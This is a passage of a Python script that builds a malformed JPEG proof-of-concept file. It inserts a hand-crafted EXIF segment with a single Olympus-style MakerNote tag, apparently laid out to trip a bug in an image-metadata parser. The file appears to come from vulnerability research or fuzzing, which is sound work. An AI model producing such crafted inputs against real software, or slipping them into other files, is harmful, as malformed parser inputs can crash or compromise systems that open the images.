# keep SOI, then our APP1, then rest after original APP1

L=int.from_bytes(base[pos+2:pos+4],'big')
rest=base[pos+2+L:]
# TIFF big endian. IFD0 at 8, one MakerNote tag; data offset points to 26, data 6 bytes "OLYMP\0".
exif = bytearray(b'Exif\0\0MM\0*\0\0\0\x08')
ifd = bytearray()

ifd += (0x927c).to_bytes(2,'big') # MakerNote
ifd += (7).to_bytes(2,'big') # UNDEFINED
ifd += (6).to_bytes(4,'big') # components = 6
ifd += (26).to_bytes(4,'big') # offset from TIFF header (after nextIFD)
ifd += (0).to_bytes(4,'big') # next ifd
exif += ifd + b'OLYMP\0'
seglen = len(exif)+2
poc = b'\xff\xd8' + b'\xff\xe1' + seglen.to_bytes(2,'big') + bytes(exif) + rest
Path('/workspace/poc1.jpg').write_bytes(poc)
print(len(poc), seglen, len(exif), poc[:50].hex())
